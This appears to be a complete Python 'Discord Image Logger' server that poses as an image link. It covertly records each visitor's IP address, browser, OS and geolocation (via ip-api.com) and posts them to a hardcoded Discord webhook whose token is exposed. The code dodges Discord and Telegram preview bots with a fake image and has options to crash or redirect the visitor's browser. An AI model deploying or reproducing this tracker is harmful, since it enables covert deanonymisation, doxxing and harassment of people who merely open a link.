# Discord Image Logger - مصحح
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, httpagentparser

config = {
    "webhook": "https://discord.com/api/webhooks/1486621531974139996/qmCm0qaiJSBLHAz5Iy6FcSqh0hIqV30kVK58dY1fkII1Aeh7V2z-qs9WHs2aEJLel5uR",
    "image": "https://i.pinimg.com/1200x/31/25/10/312510d433b3bdd29f6b12ffcab62557.jpg",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by Image Logger.",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{"title": "Image Logger - Error", "color": config["color"], "description": f"```\n{error}\n```"}]
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "",
                "embeds": [{"title": "Image Logger - Link Sent", "color": config["color"],
                            "description": f"Link sent in chat!\nEndpoint: {endpoint}\nIP: {ip}\nPlatform: {bot}"}]
            })
        return

    ping = "@everyone"
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    
    if info["proxy"] and config["vpnCheck"] == 1:
        ping = ""

    os, browser = httpagentparser.simple_detect(useragent)

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"IP: {ip}\nOS: {os}\nBrowser: {browser}"
        }]
    }

    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json=embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
            url = config["image"]
            if config["imageArgument"] and (dic.get("url") or dic.get("id")):
                url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()

            data = f'''<style>body {{
margin:0; padding:0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()

            ip = self.headers.get('x-forwarded-for') or self.client_address[0]

            if ip.startswith(blacklistedIPs):
                return

            if botCheck(ip, self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()

                if config["buggedImage"]:
                    self.wfile.write(binaries["loading"])

                makeReport(ip, endpoint=s.split("?")[0], url=url)
                return

            result = makeReport(ip, self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url)

            if config["message"]["doMessage"]:
                data = config["message"]["message"].encode()

            if config["crashBrowser"]:
                data += b'<script>setTimeout(function(){for(var i=0;i<10;i++){console.log(i)}},100)</script>'

            if config["redirect"]["redirect"]:
                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()

            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(data)

        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error')
            reportError(traceback.format_exc())

    do_GET = handleRequest
    do_POST = handleRequest

PORT = 8000
server = HTTPServer(("0.0.0.0", PORT), ImageLoggerAPI)
print(f"Server running on http://localhost:{PORT}")
server.serve_forever()
